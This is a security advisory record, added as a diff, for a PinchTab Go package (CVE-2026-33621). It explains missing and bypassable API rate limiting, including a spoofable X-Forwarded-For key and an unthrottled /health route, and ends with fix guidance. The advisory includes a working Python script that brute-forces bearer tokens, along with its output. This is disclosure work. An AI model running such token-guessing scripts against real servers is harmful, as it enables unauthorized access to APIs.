@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-j65m-hv65-r264",
+  "modified": "2026-03-27T21:33:07.087167Z",
+  "published": "2026-03-24T19:47:40Z",
+  "aliases": [
+    "CVE-2026-33621",
+    "GO-2026-4821"
+  ],
+  "summary": "PinchTab: Unapplied Rate Limiting Middleware Allows Unbounded Brute-Force of API Token",
+  "details": "### Summary\nPinchTab `v0.7.7` through `v0.8.4` contain incomplete request-throttling protections for auth-checkable endpoints. In `v0.7.7` through `v0.8.3`, a fully implemented `RateLimitMiddleware` existed in `internal/handlers/middleware.go` but was not inserted into the production HTTP handler chain, so requests were not subject to the intended per-IP throttle.\n\nIn the same pre-`v0.8.4` range, the original limiter also keyed clients using `X-Forwarded-For`, which would have allowed client-controlled header spoofing if the middleware had been enabled. `v0.8.4` addressed those two issues by wiring the limiter into the live handler chain and switching the key to the immediate peer IP, but it still exempted `/health` and `/metrics` from rate limiting even though `/health` remained an auth-checkable endpoint when a token was configured.\n\nThis issue weakens defense in depth for deployments where an attacker can reach the API, especially if a weak human-chosen token is used. It is not a direct authentication bypass or token disclosure issue by itself. PinchTab is documented as local-first by default and uses `127.0.0.1` plus a generated random token in the recommended setup.\n\nPinchTab's default deployment model is a local-first, user-controlled environment between the user and their agents; wider exposure is an intentional operator choice. This lowers practical risk in the default configuration, even though it does not by itself change the intrinsic base characteristics of the bug.\n\nThis was fully addressed in `v0.8.5` by applying `RateLimitMiddleware` in the production handler chain, deriving the client address from the immediate peer IP instead of trusting forwarded headers by default, and removing the `/health` and `/metrics` exemption so auth-checkable endpoints are throttled as well.\n\n### Details\n**Issue 1 — Middleware never applied in `v0.7.7` through `v0.8.3`:**\nThe production server wrapped the HTTP mux without `RateLimitMiddleware`:\n\n```\n// internal/server/server.go — v0.8.3\nhandlers.LoggingMiddleware(\n    handlers.CorsMiddleware(\n        handlers.AuthMiddleware(cfg, mux),\n        // RateLimitMiddleware is not present here in v0.8.3\n    ),\n)\n```\n\nThe function exists and is fully implemented:\n\n```\n// internal/handlers/middleware.go — v0.8.3\nfunc RateLimitMiddleware(next http.Handler) http.Handler {\n    startRateLimiterJanitor(rateLimitWindow, evictionInterval)\n    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n        // ... 120 req / 10s logic ...\n    })\n}\n```\n\nBecause `RateLimitMiddleware` was never referenced from the production handler chain in `v0.7.7` through `v0.8.3`, the intended request throttling was inactive in those releases.\n\n**Issue 2 — `X-Forwarded-For` trust in the original limiter (`v0.7.7` through `v0.8.3`):**\nEven if the middleware had been applied, the original IP identification was bypassable:\n\n```\n// internal/handlers/middleware.go — v0.8.3\nhost, _, _ := net.SplitHostPort(r.RemoteAddr)  // real IP\nif xff := r.Header.Get(\"X-Forwarded-For\"); xff != \"\" {\n    // No validation that request came from a trusted proxy\n    // Client can set this header to any value\n    host = strings.TrimSpace(strings.Split(xff, \",\")[0])\n}\n// host is now client-influenced — rate limit key is spoofable\n```\n\nIn `v0.7.7` through `v0.8.3`, if the limiter had been enabled, a client could have influenced the rate-limit key through `X-Forwarded-For`. This made the original limiter unsuitable without an explicit trusted-proxy model.\n\n**Issue 3 — `/health` and `/metrics` remained exempt through `v0.8.4`:**\n`v0.8.4` wired the limiter into production and switched to the immediate peer IP, but it still bypassed throttling for `/health` and `/metrics`:\n\n```\n// internal/handlers/middleware.go — v0.8.4\nfunc RateLimitMiddleware(next http.Handler) http.Handler {\n    startRateLimiterJanitor(rateLimitWindow, evictionInterval)\n    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n        p := strings.TrimSpace(r.URL.Path)\n        if p == \"/health\" || p == \"/metrics\" || strings.HasPrefix(p, \"/health/\") || strings.HasPrefix(p, \"/metrics/\") {\n            next.ServeHTTP(w, r)\n            return\n        }\n        host := authn.ClientIP(r)\n        // ...\n    })\n}\n```\n\nThat left `GET /health` unthrottled even though it remained an auth-checkable endpoint when a server token was configured, so online guessing against that route still saw no rate-limit response through `v0.8.4`.\n\n### PoC\nThis PoC assumes the server is reachable by the attacker and that the configured API token is weak and guessable, for example `password`.\n\n**PoC Code**\n```\n#!/usr/bin/env python3\n# brute_force_poc.py — demonstrates unthrottled token guessing on /health\nimport urllib.request, urllib.error, time, sys\n\nTARGET   = \"http://localhost:9867/health\"\nWORDLIST = [f\"wrong-{i:03d}\" for i in range(150)] + [\"password\"]\ncounts = {}\n\nprint(f\"[*] Brute-forcing {TARGET} — no rate limit protection\")\nstart = time.time()\nfor token in WORDLIST:\n    req = urllib.request.Request(TARGET)\n    req.add_header(\"Authorization\", f\"Bearer {token}\")\n    try:\n        with urllib.request.urlopen(req, timeout=5) as r:\n            print(f\"[+] FOUND: token={token!r}  HTTP={r.status}\")\n            counts[r.status] = counts.get(r.status, 0) + 1\n            sys.exit(0)\n    except urllib.error.HTTPError as e:\n        print(f\"[-] token={token!r}  HTTP={e.code}\")\n        counts[e.code] = counts.get(e.code, 0) + 1\n\nelapsed = time.time() - start\nprint(f\"[*] {len(WORDLIST)} attempts in {elapsed:.2f}s — \"\n      f\"{len(WORDLIST)/elapsed:.0f} req/s  (no 429 received)\")\nprint(f\"[*] status counts: {counts}\")\n```\n\nAfter run\n```\npython3 ratelimit.py\n[*] Brute-forcing http://localhost:9867/health — no rate limit protection\n[-] token='wrong-000'  HTTP=401\n...\n[-] token='wrong-149'  HTTP=401\n[+] FOUND: token='password'  HTTP=200\n[*] 151 attempts in 0.84s — 180 req/s  (no 429 received)\n[*] status counts: {401: 150, 200: 1}\n```\n\n**Observation:**\n1. In `v0.7.7` through `v0.8.3`, rapid requests do not return HTTP 429 because `RateLimitMiddleware` is not active in production.\n2. In `v0.8.4`, the same `/health` PoC still does not return HTTP 429 because `/health` is explicitly exempted from rate limiting.\n3. The PoC succeeds only when the configured token is weak and appears in the tested candidates.\n4. The original `X-Forwarded-For` behavior in `v0.7.7` through `v0.8.3` shows that the first limiter design would not have been safe to rely on behind untrusted clients.\n5. This PoC does not demonstrate token disclosure or authentication bypass independent of token guessability.\n\n### Impact\n1. Reduced resistance to online guessing of weak or reused API tokens in deployments where an attacker can reach the API.\n2. Loss of the intended per-IP throttling for burst requests against protected endpoints in `v0.7.7` through `v0.8.3`, and against `/health` in `v0.8.4`.\n3. Higher abuse potential for intentionally exposed deployments than intended by the middleware design.\n4. This issue does not by itself disclose the token, bypass authentication, or make all deployments equally affected. Installations using the default local-first posture and generated high-entropy tokens have substantially lower practical risk.\n\n### Suggested Remediation\n1. Apply `RateLimitMiddleware` in the production handler chain for authenticated routes.\n2. Derive the rate-limit key from the immediate peer IP by default instead of trusting client-supplied forwarded headers.\n3. Do not exempt auth-checkable endpoints such as `/health` and `/metrics` from rate limiting.\n4. Consider an additional auth-failure throttle so repeated invalid token attempts are constrained even when endpoint-level behavior changes in the future.\n\n**Screenshot capture**\n\u003cimg width=\"553\" height=\"105\" alt=\"ภาพถ่ายหน้าจอ 2569-03-18 เวลา 13 03 01\" src=\"https://github.com/user-attachments/assets/ab5cd7af-5a67-40ae-aae3-1f4737afd32e\" /\u003e",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/pinchtab/pinchtab",
+        "purl": "pkg:golang/github.com/pinchtab/pinchtab"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.7.7"
+            },
+            {
+              "fixed": "0.8.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-j65m-hv65-r264/GHSA-j65m-hv65-r264.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pinchtab/pinchtab/security/advisories/GHSA-j65m-hv65-r264"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33621"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pinchtab/pinchtab/commit/c619c43a4f29d1d1a481e859c193baf78e0d648b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pinchtab/pinchtab"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pinchtab/pinchtab/releases/tag/v0.8.4"
+    }
+  ]
+}
